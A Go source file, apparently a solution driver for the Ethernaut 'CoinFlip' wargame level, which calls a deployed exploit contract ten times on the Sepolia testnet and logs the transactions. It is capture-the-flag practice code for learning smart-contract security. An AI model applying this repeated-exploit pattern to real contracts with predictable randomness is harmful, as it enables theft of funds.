package main

import (
	"context"
	"crypto/ecdsa"
	"log"
	"math/big"
	"time"

	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/rbrick/ethernaut/contracts"
)

type CoinflipPuzzle struct{}

func (*CoinflipPuzzle) Execute(rpcClient *ethclient.Client, chainId *big.Int,
	privateKey *ecdsa.PrivateKey, accountAddress common.Address) error {
	exploitAddress := common.HexToAddress("0x75D61a5c6096F43dD4b233187209d8DC79654832")
	exploitContract, err := contracts.NewCoinFlipExploit(exploitAddress, rpcClient)

	if err != nil {
		return err
	}

	keyedTransactor, err := bind.NewKeyedTransactorWithChainID(privateKey, chainId)

	if err != nil {
		return err
	}

	for i := 0; i < 10; i++ {
		tx, err := exploitContract.Exploit(keyedTransactor)
		if err != nil {
			log.Println(err)
			return err
		}

		log.Println("submitted transaction ", (i + 1), tx.Hash())
		bind.WaitMined(context.Background(), rpcClient, tx)
		log.Println("completed transaction ", (i + 1), "https://sepolia.etherscan.io/tx/"+tx.Hash().String())
		time.Sleep(15 * time.Second)
	}

	return nil
}
